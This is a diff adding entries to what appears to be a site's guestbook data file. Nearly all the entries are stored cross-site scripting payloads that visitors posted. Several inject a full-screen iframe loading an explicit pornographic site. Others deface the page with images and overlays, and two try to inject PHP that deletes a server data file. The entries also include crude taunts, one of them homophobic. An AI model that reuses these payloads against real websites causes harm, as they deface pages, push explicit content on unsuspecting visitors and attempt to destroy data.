@@ -1,0 +1,26 @@
+test:<script>alert("H4xX0ReD by Splitty :)");</script>
+anonymous:Wherever there's a field, there's a will to hack it. 
+:
+:
+Nicht NikxDa:<script type="text/javscript">alert("Nope");</script>
+not nikxda:&#60;script type="text/javscript"&#62alert("I can do it too!");&#60;/script&#62
+:
+test:<script>console.log("hi");</script>
+test:<script>alert("I can do it too. See sourcecode above.");</script>
+test:<script>var iframe = document.createElement('iframe'); iframe.src = "http://www.pornhub.com/gayporn"; document.body.appendChild(iframe);</script>
+test:<script>var iframe = document.createElement('iframe'); iframe.src = "http://www.pornhub.com/gayporn"; iframe.style.position = "absolute"; iframe.style.width="100%"; iframe.style.height="100%"; iframe.style.top="0";document.body.appendChild(iframe);</script>
+test:<script>document.write('<img src="http://pbs.twimg.com/media/BBbrVmcCAAEgnfp.jpg" style="width: 100%; height: 100%;"></img>');</script>
+test:<script>document.write("<img src=\"http://pbs.twimg.com/media/BBbrVmcCAAEgnfp.jpg\" style=\"width: 100%; height: 100%;\"></img>");</script>
+test:<script>document.write("<?php unlink(\"/var/www/html/tel/data.txt\");?>");</script>
+test:<script>var div = document.createElement("div"); div.style.position="absolute"; div.style.top="20px"; div.style.right="20px"; div.style.padding="20px"; div.textContent="Enjoy! @nikxda";document.body.appendChild(div);</script>
+test:<script>var div = document.createElement("div"); div.style.position="absolute"; div.style.top="20px"; div.style.right="20px"; div.style.padding="20px"; div.textContent="Enjoy! @nikxda"; div.style.zIndex="999"; document.body.appendChild(div);</script>
+splitty:<script>document.write("<?php unlink('/var/www/html/tel/data.txt'); ?>");</script>
+test:<script>var d = document.getElementsByTagName("body")[0]; d.style.padding=0; d.style.margin=0; d.overflow="hidden";</script>
+test:<script>alert("Enjoy some gayporn! :P");</script>
+test:<script>var d = document.getElementsByTagName("body")[0]; d.style.padding=0; d.style.margin=0; d.style.overflow="hidden";</script>
+Splitty:Hello!
+test:<script>alert("Totally not NikxDa's work... ;)");</script>
+test:<script>alert("WOOP WOOP THATS THE SOUND OF THE POLICE");</script>
+test:<script>var d = document.getElementsByTagName("body")[0]; d.style.padding=0; d.style.margin=0; d.style.overflow="hidden";</script>
+test:<script>alert("YOOO");</script>
+test:<script>var iframe = document.createElement('iframe'); iframe.src = "http://www.pornhub.com/gayporn"; document.body.appendChild(iframe);</script>
